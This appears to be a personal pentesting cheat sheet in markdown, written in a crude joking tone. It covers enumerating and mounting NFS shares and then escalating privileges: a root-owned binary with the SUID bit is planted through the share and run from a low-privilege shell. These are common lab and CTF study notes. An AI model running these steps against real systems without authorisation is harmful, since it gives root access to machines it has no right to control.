## NFS (Network File Shits... joking)
​
NFS stands for "Network File System" and allows a system to share directories and files with others over a network.
​
​
### Enumerating
​
1. #### Port Scanning
   - [[Nmap#Syn Scan]]
   
   ​
2. #### Enumerate Shares
   - Go to the mountain:
   >[!Tip] Chebra
   >```
   >showmount -e {target IP}
   >```
   
   ​
3. #### Mounting NFS shares
   - Create a temporary directory (must in /tmp) in your ==attacking machine== to recieve:
   >[!Example]
   >```
   >mkdir /tmp/mount
   >```
   
   - Mount the mounty mounter:
   >[!Tip] Chebra
   >```
   >sudo mount -t nfs {target IP}:{share} {path of temporary dir} -nolock
   >```
   
   ​
4. #### Gather everything
   - If you find something, go and EXPLOOOOOOOOOOOOOOOOOOOOOOOOODE!
     
   
   ​
​
### Exploiting
​
1. #### Go outside, come inside
   - Change to the mounting machine to upload some shit
   
   ​
2. #### Download (outside) the fakin file
   - Download or prepare a file thats gonna give you the madafaka escalation (fe. a bash)
   
   ​
3. #### Permissions (outside)
   - Remember to be outside the mounti mountain to set this permissions:
   >[!Tip] Chebra
   >```
   >sudo chown root {fakin file}
   >```
   
   ​
4. #### Insert the $#%! (inside <-- outside)
   - Copy to the mount, in this case we are supposing u' r' inside already. Also we are supposing that there's no gonna be any chance in the name, so it continues as {fakin file}:
   >[!Tip] Chebra
   >```
   >cp {fakin file} .
   >```
   
   ​
5. #### Add SUID bit
   - Sweeden:
   >[!Tip] Chebra
   >```
   >sudo chmod +s {fakin file}
   >```
   
   ​
6. #### Now go, for real, inside
   - Use an SSH or whatever that let you enter the system with low privs
   
   ​
7. #### Now that you r' in, EXECUTE!
   - Don't forget to Seek and Destroy inside